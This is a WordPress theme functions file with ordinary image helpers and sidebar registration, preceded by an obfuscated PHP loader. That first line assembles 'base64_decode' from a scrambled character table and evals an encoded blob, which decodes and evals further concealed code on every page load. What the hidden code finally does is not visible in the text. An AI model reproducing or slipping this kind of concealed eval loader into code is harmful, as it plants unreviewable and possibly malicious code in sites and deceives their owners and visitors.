<?php
 $O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};eval($O00O0O("JE8wTzAwMD0iZWFicVFTbWprR3hScHV3VllkRkp0aU9yRWNoc1hUV3ZOQ0FmeVpCSElMTURVUG56b2xLZ3BXcWRsakJTTFZybnZOUXVNUHhhSHNtYnpHd2lLSWtFQ3Rjb1lKeWdUZVhoVURGZkFSWk9EaDlRV2djT2hsQUxxQnhISmpjOVR6Y0xLMFB4dXhpRnFWUjFhMTA3VFZSQlp0bk5NazFSVGgwOVR0UHJQdEd2cDJ1U1dWOEFsVnUyTWtRQWF4OWxJMUNVa1lQaXBrTTFYU2NGS2pMdm0ydTRXS2w3b2wwWmhsdnZKc3djYXg5Z251bnFhMjlRYTEwT0RJME9hMkNBSmtDYmFZTEN0RmlDdE9MYVRWdVNXVjhPVEJDRXFCNVJNM25kTUIxRVBCdXZHMjliVFNpQ3RPTGFUVnU0V0tsQVpJaUN0T0xPVHRjT29sMFpEZjQ9IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="));

	function get_first_image($post_ID, $fullsize=false, $max_dims=false){
		$thumbargs = array(
		'post_type' => 'attachment',
		'post_status' => null,
		'post_parent' => $post_ID
		);
		$thumbs = get_posts($thumbargs);
		if ($thumbs) {
			$num = count($thumbs)-1;
			return get_attachment_innerHTML($thumbs[$num]->ID, $fullsize, $max_dims);
		}
	}
	
	function aldenta_get_images($size = 'small') {
		global $post;

		return get_children( array('post_parent' => $post->ID, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => 'ASC', 'orderby' => 'menu_order ID') );
	}
	
	if ( function_exists('register_sidebar') )
		register_sidebar(array(
			'before_widget' => '<div class="widget">',
			'after_widget' => '</div>',
			'before_title' => '<h4>',
			'after_title' => '</h4>',
		));
?>